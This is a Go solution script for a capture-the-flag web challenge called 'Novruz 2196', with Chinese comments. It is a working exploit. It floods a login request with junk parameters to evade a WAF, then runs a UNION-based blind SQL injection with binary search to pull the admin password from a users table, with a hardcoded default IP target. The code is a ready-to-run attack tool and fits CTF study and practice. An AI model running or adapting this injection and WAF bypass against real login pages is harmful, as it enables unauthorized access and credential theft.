// =============================================================================
// 题目名称: Novruz 2196
// 题目类别: Web - WAF 绕过 + SQL 盲注
// 解题思路: 登录接口有 WAF 保护，通过大量垃圾参数填充绕过 WAF，
//
//	再用 UNION SELECT + 二分法盲注逐字符提取 admin 密码（即 flag）
//
// 用法: go run NovruzCTF_waf.go [目标地址]
//
//	示例: go run NovruzCTF_waf.go http://95.111.234.103:10007/login.php
//
// =============================================================================
package main

import (
	"bytes"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"time"
)

const (
	defaultWAFTarget = "http://95.111.234.103:10007/login.php"
	// 垃圾参数数量，用于绕过 WAF 参数限制
	junkParamCount = 100
	// 最大提取长度
	maxExtractLen = 80
)

var client = &http.Client{
	Timeout: 10 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	},
}

// buildPayload 构造带有大量垃圾参数的 SQL 注入 payload
func buildPayload(cond string) string {
	vals := url.Values{}
	for i := 0; i < junkParamCount; i++ {
		vals.Set(fmt.Sprintf("p%d", i), "x")
	}
	injection := "' UNION SELECT CASE WHEN (" + cond + ") THEN 1 ELSE null END, 2-- "
	vals.Set("name", injection)
	vals.Set("password", "x")
	return vals.Encode()
}

// testCond 测试 SQL 条件是否为真（302 跳转表示条件成立）
func testCond(target, cond string) bool {
	body := buildPayload(cond)
	req, _ := http.NewRequest("POST", target, bytes.NewBufferString(body))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	io.ReadAll(resp.Body)
	return resp.StatusCode == 302
}

// extractString 使用二分法逐字符提取 SQL 表达式的值
func extractString(target, expr string, maxLen int) string {
	out := ""
	for pos := 1; pos <= maxLen; pos++ {
		if !testCond(target, fmt.Sprintf("length(%s) >= %d", expr, pos)) {
			break
		}
		lo, hi := 32, 126
		for lo < hi {
			mid := (lo + hi) / 2
			cond := fmt.Sprintf("unicode(substr(%s,%d,1)) > %d", expr, pos, mid)
			if testCond(target, cond) {
				lo = mid + 1
			} else {
				hi = mid
			}
		}
		out += string(rune(lo))
		fmt.Printf("pos %d: %s\n", pos, out)
	}
	return out
}

func main() {
	target := defaultWAFTarget
	if len(os.Args) > 1 {
		target = os.Args[1]
	}

	expr := "(select password from users where name='admin' limit 1)"
	flag := extractString(target, expr, maxExtractLen)
	fmt.Println("flag:", flag)
}
